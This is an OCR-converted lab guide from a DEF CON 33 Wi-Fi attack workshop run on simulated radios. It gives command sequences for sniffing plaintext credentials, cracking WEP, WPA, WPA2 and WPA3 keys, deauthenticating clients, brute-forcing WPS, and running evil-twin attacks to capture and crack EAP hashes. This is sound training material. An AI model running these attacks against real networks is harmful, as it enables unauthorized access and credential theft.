---
title: "Wi-Fi-So-Serious"
speakers: ["James Hawk"]
conference: "DEF CON"
conference_full: "DEF CON 33"
edition: "33"
year: 2025
source_pdf: "DEF CON 33 workshops/DEF CON 33 - Workshops - James Hawk - Wi-Fi-So-Serious - Lab Guide.pdf"
pages: 32
sha256: "e8bb72ad79c258f1ad1f0491933148c58fc53485a0f393209be09dc9a07ceacc"
text_chars: 18367
ocr_pages: 6
has_ocr: true
redacted_secrets: 0
ocr_confidence: 86.7
ocr_unreliable_blocks: 0
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T06:29:54Z"
---
# Wi-Fi-So-Serious

**Speakers:** James Hawk  
**Conference:** DEF CON 33  
**Source:** `DEF CON 33 workshops/DEF CON 33 - Workshops - James Hawk - Wi-Fi-So-Serious - Lab Guide.pdf` (32 pages)


## Slide 1

# Lab Guide

\```
modprobe mac80211_hwsim radios=4
\```

\```
iw dev or iwconfig
\```


> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Lab Guide
or
root@joker
-WiFi-So-serious: /home/joker/lab-1# iwconfig
no wireless extensions.
no wireless extensions.
IEEE 802.11 ESSID:off/any
Mode:Managed Access Point: Not-Associated
Retry short Limit:7 RTS thr:off Fragment
Encryption key:off
Power Management:off
IEEE 802.11 ESSID:off/any
Mode:Managed Access Point: Not-Associated
Retry short Limit:7 RTS thr:off Fragment
Encryption key:off
Power Management:off
IEEE 802.11 ESSID:off/any
Mode:Managed Access Point: Not-Associated
Retry short Limit:7 RTS thr:off Fragment
Encryption key:off
Power Management:off
IEEE 802.11 ESSID:off/any
Mode:Managed Access Point: Not-Associated
Retry short Limit:7 RTS thr:off Fragment
Encryption key:off
Power Management:off
no wireless extensions.
Tx-Power=20 dBm
thr:off
Tx-Power=20 dBm
thr:off
Tx-Power=20 dBm
thr:off
Tx-Power=20 dBm
thr:off
```

## Slide 2

## DEMO 1

#### Drivers

### `airmon-ng`

The image below is with an external Alfa card

\```
modinfo mac80211_hwsim
\```

The below image is with `modinfo` with an Alfa card

## Slide 3

Do not run `rmmod mac80211_hwsim` this will kill your simulated interfaces

\```
rmmod mt7921u
\```

\```
modprobe mt7921u
\```

## DEMO 2

Basic commands

\```
iwconfig
\```

## Slide 4

\```
iwconfig wlan0
\```

`iw dev` (this is only part of the output, pay attention to the phy# for the interface )

\```
iw wlan0 info
\```

`iw list` (this will be a huge output, don’t run it with the simulated interfaces)

## Slide 5

`iw phy <phy#> info` (you get the phy# from iw dev output)

`iw <wlan#> scan` (won’t work with the simulated interfaces)

\```
iw reg get
\```

## Slide 6

\```
iw reg set US
\```

\```
ifconfig
\```


> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
root@joker -WiFi-So-serious:/home/joker/lLab-1# iw reg set US
root@joker -WiFi-So-serious:/home/joker/lab-1# iw reg get
global
country US: DFS-FCC
(902 - 904 @ 2), (N/A, 30), (N/A)
(904 - 920 @ 16), (N/A, 30), (N/A)
(920 - 928 @ 8), (N/A, 30), (N/A)
(2400 - 2472 @ 40), (N/A, 30), (N/A)
(5150 - 5250 @ 80), (N/A, 23), (N/A), AUTO-BW
(5250 - 5350 @ 80), (N/A, 24), (@ ms), DFS, AUTO-BW
(5470 - 5730 @ 160), (N/A, 24), (@ ms), DFS
(5730 - 5850 @ 80), (N/A, 30), (N/A), AUTO-BW
(5850 - 5895 40), (N/A, 27), (N/A), NO-OUTDOOR, AUTO-BW, PASSIVE-SCAN
(5925 - 7125 @ 320), (N/A, 12), (N/A), NO-OUTDOOR, PASSIVE-SCAN
(57240 - 71000 @ 2160), (N/A, 40), (N/A)
flags=4163<UP ,BROADCAST,RUNNING,MULTICAST> mtu 1500
imet 192.168.2.31 metmask 255.255.255.0 broadcast 192.168.2.255
inet6 fe80::20c:29ff:fecS:3d57 prefixlen 64 scopeid @x20<Link>
ether 00:0c:29:c5:3d:57 txqueuelen 1000 (Ethernet)
RX packets 73360 bytes 109849978 (109.8 MB)
RX errors © dropped © overruns 0 frame 0
TX packets 3182 bytes 233821 (233.8 KB)
TX errors © dropped © overruns © carrier 0 collisions 0
lo: flags=73<UP,LOOPBACK,RUNNING> mtu 65536
inet 127.0.0.1 netmask 255.0.0.0
inet6 ::1 prefixlen 128 scopeid 0x10<host>
loop txqueuelen 1000 (Local Loopback)
RX packets 196 bytes 19622 (19.6 KB)
RX errors 0 dropped @ overruns 0 frame 0
TX packets 196 bytes 19622 (19.6 KB)
TX errors © dropped © overruns © carrier 0 collisions 0
WLanO: flags=4099<UP,BROADCAST,MULTICAST> mtu 1500
ether 02:00:00:00:00:00 txqueuelen 1000 (Ethernet)
RX packets 0 bytes 0 (0.0 B)
RX errors 0 dropped @ overruns 0 frame 0
TX packets 0 bytes 0 (0.0 B)
TX errors 0 dropped © overruns © carrier 0 collisions 0
```

## Slide 7

`ip addr` (check if you device has an IP)

\```
ip link
\```

\```
airmon-ng
\```


> Recovered by OCR — confidence 87/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
(check if you device has an IP)
root@joker -WiFi-So-serious:/home/joker/lab-1# ip addr
OOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
lLink/Loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
inet 127.0.0.1/8 scope host lo
valid_lft forever preferred_lft forever
inet6 1/128 scope host noprefixroute
valid_lft forever preferred_lft forever
: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
altname enp2s1
inet 192.168.2.31/24 brd 192.168.2.255 scope global dynamic noprefixroute ens33
valid_lft 1404sec preferred_lft 1404sec
inet6 fe80::20c:29ff:fecS:3d57/64 scope Link
valid_lft forever preferred_lft forever
: wlan®: <NO-CARRIER,BROADCAST ,MULTICAST ,U mtu 1500 qdisc noqueue state DOWN group default qlen
: wlani: <NO-CARRIER,BROADCAST ,MULTICAST,U mtu 1500 qdisc noqueue state DOWN group default qlen
: wlan2: <NO-CARRIER,BROADCAST ,MULTICAST,U mtu 1500 qdisc noqueue state DOWN group default qlen
link/ether 02:00:00:00:02:00 brd ff:ff:ff:ff: ff: ff
: wlan3: <NO-CARRIER,BROADCAST ,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default qlen
hwsim@: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
root@joker -WiFi-So-serious: /home/joker/lab-1# ip Link
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000
Link/Loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
: ens33: <BROADCAST,MULTICAST, mtu 1500 qdisc pfifo_fast state UP mode DEFAULT group default qlen 1000
link/ether 00:0 13d: iff: ff: ff
altname enp2s1
: wlan@: <NO-CARRIER,BROADCAST ,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN mode DORMANT group default qlen
: wlani: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN mode DORMANT group default qlen
: wlan2: <NO-CARRIER,BROADCAST ,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN mode DORMANT group default qlen
: wlan3: <NO-CARRIER,BROADCAST ,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN mode DORMANT group default qlen
: hwsimO: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN mode DEFAULT group default qlen 1000
root@joker -WiFi-So-serious: /home/joker/lab-1# airmon-ng
Interface Driver Chipset
wland mac80211_hwsim Software simulator of 802.11 radio(s) for mac80211
wlan1 mac80211_hwsim Software simulator of 802.11 radio(s) for mac80211
wlan2 mac80211_hwsim Software simulator of 802.11 radio(s) for mac80211
wlan3 mac80211_hwsim Software simulator of 802.11 radio(s) for mac80211
```

## Slide 8

### `rfkill`

`rfkill unblock wifi` (or bluetooth)

\```
nmcli
\```

## Slide 9

\```
nmcli device show wlan0
\```


> Recovered by OCR — confidence 86/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
"Intel 82545EM"
ethernet (e1000), 00:0C:29:C5:3D:57, hw, mtu 1500
ip4 default
inet4 192.168.2.31/24
route4 192.168.2.0/24 metric 100
route4 default via 192.168.2.2 metric 100
inet6 fe80::20c:29ff:fecS:3d57/64
route6 fe80::/64 metric 256
"Lo"
loopback (unknown), 00:00:00:00:00:00, sw, mtu 65536
inet4 127.0.0.1/8
inet6 ::1/128
wifi (mac80211_ hwsim), 02:00:00:00:00:00, hw, mtu 1500
"wlani"
wifi (mac80211_ hwsim), 02:00:00:00:01:00, hw, mtu 1500
root@joker -WiFi-So-serious: /home/joker/lLab-1# nmcli device show wlandO
GENERAL.
GENERAL.
GENERAL.
GENERAL.
GENERAL.
GENERAL.
GENERAL.
DEVICE: wland
HWADDR: 02:00:00:00:00:00
MTU: 1500
STATE: 30 (disconnected)
CONNECTION: --
CON-PATH:
IP4.GATEWAY:
IP6.GATEWAY:
```

## Slide 10

#### `TMUX`

\```
tmux
\```

\```
CTRL+B SHIFT+5
\```

\```
CTRL+B SHIFT+"
\```


> Recovered by OCR — confidence 75/100 on the text kept, 60/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
TMUX
"joker -WiFi-So-Serious" 05:53 21-May-2.
root @joker -WiFi-So-seriou
home/joker/lab-1# fj
root@joker-WiFi-So-serious: /home/joker/lab-1
```

## Slide 11

`CTRL+B d` detaches from the `tmux` session

\```
tmux ls
\```

`tmux attach -t 0` Connect to a session

DEMO 3 `iwconfig`

\```
ifconfig<wlan#> down
iwconfig<wlan#> mode monitor
ifconfig<wlan#> up
\```

\```
ip link set dev <wlan#> down
iw <wlan#> set type monitor
ip link set dev <wlan#> up
iw dev
\```

## Slide 12

\```
iwconfig <wlan#> channel <#>
\```

`iw dev <wlan#> set channel <#>` (channel changed to 11)

`iw dev <wlan#> set freq <####>` (Freq 6295)

\```
airmon-ng check kill
\```

## Slide 13

\```
airmon-ng start<wlan#>
\```

\```
airmon-ng start<wlan#> <#>
\```

\```
airmon-ng stop<wlan#mon>
\```

\```
airodump-ng –band abg <wlan#mon>
\```

## Slide 14

`airodump-ng –C0 <wlan#mon>` (scan all freqs the card is capable of, useful for scanning 6ghz)

\```
airodump-ng –c <#> <wlan#mon> -w <file> --output-format pcap
\```

\```
kismet
\```

navigate to localhost:2501 in a web browser

Next go to:

## Slide 15

Once the data source opens it will look for all available cards, even Bluetooth. Be careful with which cards you choose to use if the device is already in use kismet will put it in monitor mode.

Select the card you want. You can select as many cards as you want.

You can turn off channels by clicking on them. It can be a bit of a pain to get everything set up right with the channels, but you can just leave them all enabled.

Kismet output file will be in whatever folder you started it in. kismet outputs a .kismet file, you can convert into a pcap using:

\```
kismetbd_to_pcap -i <*.kismet> -o <outfile.pcap>
\```

## Slide 16

## LAB 1

LAB OPEN

<u>TASK: Cofee Shop atf ackt</u>

The clients open SSID SweetB-Guest. This will be live so you will need to connect a Wi-Fi card and make sure it is connected to the VM.

Put the card in monitor mode

\```
airmon-ng start<wlan#>
\```

Find out what channel the client SSID is on. Also take note of BSSID `airodump-ng –band abg <wlan#mon>`

airodump-ng will save the file where you run this command

\```
airodump-ng -c <#>--bssid<mac>--essid<SSID><wlan#mon>-
w<file>--output-format pcap
\```

Use Wireshark to see what protocols are in use. There may be some unencrypted protocols in use.

Statistics -> Protocol Hierarchy

\```
http.request.method == "POST"
\```

## Slide 17

HTTP Post with credentials in it.

File -> Export Objects -> HTTP


> Recovered by OCR — confidence 90/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Frame 850: 739 bytes on wire (5912 bits), 739 bytes captured (5912 bits)
IEEE 802.11 QoS Data, Flags: ...P...T
Logical-Link Control
Internet Protocol Version 4, Src: 192.168.8.237, Dst: 44.228.249.3
Transmission Control Protocol, Src Port: 35862, Dst Port: 80, Seq: 1, Ack: 1, Len: 653
SaPOST /userinfo.php HTTP/1.1\r\n
» [Expert Info (Chat/Sequence): POST /userinfo.php HTTP/1.1\r\n]
Request Method: POST
Request URI: /userinfo.php
Request Version: HTTP/1.1
Host: testphp.vulnweb.com\r\n
Connection: keep-alive\r\n
Content-Length: 28\r\n
Cache-Control: max-age=0\r\n
Origin: http://testphp.vulnweb.com\r\n
Upgrade-Insecure-Requests: 1\r\n
User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.q
Referer: http://testphp.vulnweb.com/login.php\r\n
Accept-Encoding: gzip, deflate\r\n
Accept-Language: en-US, en;q=0.9\r\n
\r\n
[HTTP request 1/8]
File Data: 28 bytes
»~ HTML Form URL Encoded: application/x-www-form-urlencoded
~ Form item: "uname" = "Chewy"
Key: uname
Value: Chewy
~ Form item: "pass" = "lLavalampi23"
Key: pass
Value: lavalamp123
HTTP Post with tials in it.
File -> Export Objects -> HTTP
Wireshark - Export - HTTP object list
Text Filter: | Content Type: All Content-Types ~
Packet ~ Hostname Content Type Size Filename
850 testphp.vulnweb.com application/x-www-form-urlencoded 28 bytes userinfo.php
886 testphp.vulnweb.com text/html 14 bytes userinfo.php
932 testphp.vulnweb.com text/html 5523 bytes login.php
1616 testphp.vulnweb.com text/html 170 bytes /
1797 testphp.vulnweb.com text/html 4958 bytes /
1962 testphp.vulnweb.com text/html 4958 bytes /
2187 testphp.vulnweb.com application/x-www-form-urlencoded 29 bytes search.php?test=query
2240 testphp.vulnweb.com text/html 4776 bytes search.php?test=query
3675 testphp.vulnweb.com text/html 6401 bytes product.php?pic=3
3765 testphp.vulnweb.com image/jpeg 9692 bytes 3.jpg&size=160
Save All x Close Ei Save
```

## Slide 18

WE can export “objects” from the unencrypted traffic that may be of interest. You can save all of them or export individual files.

LAB 1.1

LAB OWE (On your own)

<u>TASK: Look at the diference between OWE and an Open network f</u>

\```
modprobe mac80211_hwsim radios=4
\```

You will need at least three windows or use `tmux`

\```
cd /home/rogue1/lab-1/LAB-OWE
\```

\```
hostapd SweetB-OWE.conf
\```

\```
wpa_supplicant -i wlan1 -c owe.conf
\```

\```
airmon-ng start<wlan#>
airodump-ng --band abg <wlan#mon>
airodump-ng –c <#>--essid <essid> --bssid <bssid> -w
<output.pcap> --output-format pcap
\```

## Slide 19

<u>Start up the 1</u><sup>st</sup> <u>set of Labs</u> `cd /home/rogue1/lab-1/ ./Lab-r1.sh`

Quick note for cleaning up and troubleshooting in the lab. If you need to rerun the script or when we change to the next round of labs run this 1<sup>st</sup> .

\```
killall hostapd
killall wpa_supplicant
rmmod mac80211_hwsim
\```

LAB-2

WEP LAB

<u>TASK: Obtain the WEP Key</u>

The clients WEP enabled SSID is SweetB-WEP. Attack WEP can sometimes be problematic you may need to redo the fake authentication an the arp replay attack a couple of times to get it to work

\```
tmux
\```

Divide the screen into 4 sections

\```
CTRL b + SHIFT 5
CTRL b + SHIT “
CTRL b <-
\```

## Slide 20

\```
CTRL b ->
\```

\```
airmon-ng start <wlan#>
\```

\```
airodump-ng –-band abg <wlan#mon>
\```

Next, we need to refine our airodump-ng parameters

\```
airodump-ng –c <#>--essid <essid> --bssid <bssid> -w
<output.pcap> --output-format pcap
\```

Fake authenticate to the network

\```
aireplay-ng -1 6000 -o 1 -q 10 -e <essid> -a <bssid> -h
<tgtmac> <wlan#mon>
\```

## Slide 21

Arp replay attack

\```
aireplay-ng -3 -b<bssid>-h<tgtmac> <wlan#>
\```

So, to get this attack to work in our lab we need to `ping 192.168.8.5` (any address in the subnet that is not in use). Bottom line we need ARP packets for this attack to work and the way we have it set up there won’t be any unless we make some.

\```
aircrack-ng -b <bssid> <output.pcap>
\```

Once it cracks you will get the key, not a passphrase

## Slide 22

## LAB-3

WPA LAB

<u>TASK: Obtain the WPA password</u>

\```
airmon-ng start<wlan#>
airodump-ng --band abg <wlan#mon>
\```

\```
airodump-ng -c<#>--bssid<mac><wlan#mon>-w<output.pcap>
--output-formatpcap
\```

Deauth the client

\```
aireplay-ng -0 5 -a<bssid>-c<client> <wlan#mon>
\```

After the deauth has completed you should see this in the airodump-ng window

With the captured 4-way handshake now we can crack it. Password list is in

\```
/home/rogue1/opt/
\```

\```
aircrack-ng -w<password.lst>-b<bssid><output.cap>
\```

## Slide 23

The speed at which it is cracked depends on the list and on the password. If a strong password is in use the dictionary attack probably won’t work.

## LAB-4

WPA2 LAB

<u>TASK: Obtain the WPA2 password</u>

\```
airmon-ng start<wlan#>
airodump-ng --band abg <wlan#mon>
\```

\```
airodump-ng -c<#>--bssid<mac><wlan#mon>-w<output.pcap>
--output-formatpcap
\```

Deauth the client

\```
aireplay-ng -0 5 -a<bssid>-c<client> <wlan#mon>
\```

## Slide 24

After the deauth has completed you should see this in the airodump-ng window. We should see WPA Handshake in the top right corner.

With the captured 4-way handshake now we can crack it. Password list is in `/home/rogue1/opt/`

\```
aircrack-ng -w<password.lst>-b<bssid><output.cap>
\```

<u>Start up the 2</u><sup>nd</sup> <u>set of Labs</u> Frist thing we need to do a little clean up `killall hostapd killall wpa_supplicant rmmod mac80211_hwsim` Next, we need to start up the next set of labs. `cd /home/rogue1/lab-1/`

## Slide 25

\```
./Lab-r2.sh
\```

## LAB-5

WPS LAB

<u>TASK: Find the channel and the BSSID of the AP using WPS</u>

\```
airmon-ng start<wlan#>
airodump-ng --band abg <wlan#mon> --wps
\```

\```
wash -i<wlan#mon>
\```

This network is not vulnerable to WPS attacks.

If it was you can use these commands to attack the network.

Brute force the pin. This will take a long time

\```
reaver -i<wlan#mon>-b <bssid>
\```

Bully can also brute force the pin but it can also execute the pixiewps attack which has more success against WPS version 2.0 `bully –b <bssid> -d -c # <wlan#mon>`

## LAB-6

WPA3 LAB

<u>TASK 1: Obtain the WPA3 password</u>

\```
airmon-ng start<wlan#>
\```

## Slide 26

\```
airodump-ng --band abg <wlan0mon>
airodump-ng -c<#>--bssid<mac><wlan#mon>-w<output.pcap>
--output-formatpcap
\```

\```
cd /home/rogue1/opt/wacker/
\```

\```
./wacker.py --wordlist <wordlist> --interface <wlan#>--ssid
<ssid>--bssid<mac>--freq<####>
\```

Wacker can take a long time. For the wordlist that we provided it says it would take over 96 hours to get through the list so try to curate a wordlist before you try this.

<u>TASK 2: WPA3 Evil Twin (On your own)</u>

\```
cd /home/rouge1/opt/eaphammer/
\```

You don’t want to run this on the same channel as the real AP. Pick a different channel

\```
./eaphammer –i <wlan#> -c <#> --auth wpa-psk --pmf enable –e
<SSID> --creds
\```

The `--creds` saves the output to the `loot/` folder

## Slide 27

You can use aircrack-ng against the output in the `loot/` folder. Use the command below

\```
aircarck-ng creds.hccapx –e <SSID> -w <wordlist>
\```

LAB-7

### EAP-PEAP Lab

<u>TASK 1: Recon. What is the username, EAP type, and certificate.</u>

\```
airmon-ng start<wlan#>
airodump-ng --band abg <wlan0mon>
airodump-ng -c<#>--bssid<mac><wlan#mon>-w<output.pcap>
--output-formatpcap
\```

Open Wireshark while you are still collecting packets.

1<sup>st</sup> Filter `eap`

Next

\```
eap.type
\```

Now look for user identities `eap.identity`

## Slide 28

Gather information on the certificate `x509af.subject`

<u>TASK 2: Evil Twin the client</u>

Stop all the collection

\```
airmon-ng check kill
\```

Create a certificate that looks like the client’s

\```
cd /home/rogue1/opt/eaphammer
\```

\```
./eaphammer --cert-wizard
\```

## Slide 29

#### Now let’s run our evil twin

\```
./eaphammer --interface<wlan#>--negotiate balanced --auth
wpa-eap --bssid<mac>--essid<SSID>--creds
\```

#### Expected output

Now we copy the hashcat netntlm hash to a file ( `nano hashes.txt` ) and run this command. You may have issues with hashcat it is very resource intensive

\```
hashcat -m 5500 hashes.txt rockyouwifi.txt
\```

Or John the Ripper

\```
john --format=netntlm hashes.txt --wordlist=rockyouwifi.txt
\```

## Slide 30

## LAB-8

<u>Task: Connect SweetB-5G</u>

Create a file with the configuration below. `nano SweetB-5G.conf`

\```
network={
\```

\```
        ssid="SweetB-5G"
        key_mgmt=WPA-PSK
        psk="tinkerbell"
        priority=1
\```

\```
}
\```

Save the file `CTRL + X , Y`

#### Next

wpa_supplicant -i `<wlan#>` -c SweetB-5G.conf

## Slide 31

To get a IP address you need to run:

\```
dhclient <wlan#>
\```

\```
ip addr
\```

Useful Stuff

Hashcat cracking

Grab a hashcat hash from a pcap file: `hcxpcapngtool -o <output.hash> <input.pcap> hashcat -m 22000 <network.hash> </path/to/wordlist>`

Tshark `tshark -i <wlan#> -w <output.pcap> tshark –r <input.pcap> -Y <Wireshark display filter> tshark -r <capture.pcap> -x -V`

Tcpdump `tcpdump –D` (list all interfaces) `tcpdump -i <wlan#> -w <output.pcap> tcpdump -r <file.pcap> -s 256 type mgt subtype beacon` Airdecap-ng (drecrypt multiple packets at once) `airdecap-ng -e '<SSID>' -p <passphrase> <decrypt.cap>`

## Slide 32

Password lists `grep -E '^.{8,}$' <file.txt> > <out.txt>`
